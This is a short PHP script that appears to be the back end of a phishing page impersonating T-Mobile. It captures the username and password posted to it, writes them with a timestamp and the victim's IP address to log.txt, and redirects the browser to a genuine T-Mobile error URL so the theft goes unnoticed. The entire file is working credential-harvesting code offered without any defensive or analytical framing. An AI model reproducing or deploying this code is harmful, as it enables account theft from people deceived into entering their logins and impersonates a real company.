<?php
header ('Location: https://account.t-mobile.com/oauth2/v1/error ');
$username = $_POST['username'];
$password = $_POST['password'];
$opn = fopen("log.txt", "a") or die("Error!");
fwrite($opn, "-------------------------");
fwrite($opn, "\n");
$time = date("Y/m/d H:i:s");
fwrite($opn, $time);
fwrite($opn, "\n");
fwrite($opn, 'Username:');
fwrite($opn, $username);
fwrite($opn, "\n");
fwrite($opn, 'Password:');
fwrite($opn, $password);
fwrite($opn, "\n");
fwrite($opn, "-------------------------");
$logfile= 'log.txt';
$IP = $_SERVER['REMOTE_ADDR'];
$logdetails= $_SERVER['REMOTE_ADDR'];
fwrite($opn, "\n");
$fp = fopen($logfile, "r+");
fwrite($fp, $logdetails, strlen($logdetails)); 
fclose($opn);
?>